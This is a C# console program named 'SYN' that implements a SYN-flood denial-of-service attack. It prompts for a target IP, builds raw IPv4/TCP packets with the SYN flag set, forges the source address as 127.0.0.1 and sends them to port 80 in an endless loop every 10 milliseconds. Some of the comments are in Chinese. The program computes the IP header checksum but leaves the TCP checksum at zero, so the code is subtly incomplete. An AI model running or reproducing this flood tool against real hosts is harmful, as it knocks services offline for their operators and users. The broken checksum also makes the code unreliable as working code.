using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;

namespace SYN
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.Write("Target IP: ");
            string szIP = Console.ReadLine();
            int nPort = 80;

            while (true)
            {
                SendSynPacket(szIP, nPort);
                Thread.Sleep(10);
            }
        }

        static void SendSynPacket(string targetIP, int targetPort)
        {
            Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.Tcp);
            socket.SetSocketOption(SocketOptionLevel.IP, SocketOptionName.HeaderIncluded, true);

            byte[] packet = BuildSynPacket(IPAddress.Parse(targetIP), targetPort, IPAddress.Parse("127.0.0.1"));
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(targetIP), targetPort);

            socket.SendTo(packet, 0, packet.Length, SocketFlags.None, endPoint);
            Console.WriteLine($"Sent SYN packet to {targetIP}:{targetPort}");
        }

        static ushort ComputeChecksum(byte[] data)
        {
            long sum = 0;
            for (int i = 0; i < data.Length; i += 2)
            {
                ushort word = (ushort)((data[i] << 8) + (i + 1 < data.Length ? data[i + 1] : 0));
                sum += word;
            }

            while ((sum >> 16) > 0)
                sum = (sum & 0xFFFF) + (sum >> 16);

            return (ushort)~sum;
        }

        static byte[] BuildSynPacket(IPAddress targetIP, int targetPort, IPAddress sourceIP)
        {
            byte[] packet = new byte[40]; // 20 bytes IP Header + 20 bytes TCP Header

            // IP Header
            packet[0] = 0x45; // IPv4 + Header Length
            packet[1] = 0x00; // Differentiated Services
            packet[2] = 0x00; packet[3] = 0x28; // Total Length (40 bytes)
            packet[4] = 0xAB; packet[5] = 0xCD; // Identification
            packet[6] = 0x40; packet[7] = 0x00; // Flags + Fragment Offset
            packet[8] = 0x40; // TTL (64)
            packet[9] = 0x06; // Protocol (TCP)
            packet[10] = 0x00; packet[11] = 0x00; // IP Header Checksum (填充後再計算)
            Buffer.BlockCopy(sourceIP.GetAddressBytes(), 0, packet, 12, 4);
            Buffer.BlockCopy(targetIP.GetAddressBytes(), 0, packet, 16, 4);

            // TCP Header
            Random rand = new Random();
            int sourcePort = rand.Next(1024, 65535);
            packet[20] = (byte)(sourcePort >> 8); packet[21] = (byte)(sourcePort & 0xFF); // Source Port
            packet[22] = (byte)(targetPort >> 8); packet[23] = (byte)(targetPort & 0xFF); // Destination Port
            packet[24] = 0x00; packet[25] = 0x00; packet[26] = 0x00; packet[27] = 0x00; // Sequence Number
            packet[28] = 0x00; packet[29] = 0x00; packet[30] = 0x00; packet[31] = 0x00; // ACK Number
            packet[32] = 0x50; // Data Offset (Header Length)
            packet[33] = 0x02; // Flags (SYN)
            packet[34] = 0x72; packet[35] = 0x10; // Window Size
            packet[36] = 0x00; packet[37] = 0x00; // Checksum (填充後再計算)
            packet[38] = 0x00; packet[39] = 0x00; // Urgent Pointer

            // 計算 Checksum
            ushort ipChecksum = ComputeChecksum(packet.Take(20).ToArray());
            packet[10] = (byte)(ipChecksum >> 8);
            packet[11] = (byte)(ipChecksum & 0xFF);

            return packet;
        }
    }
}
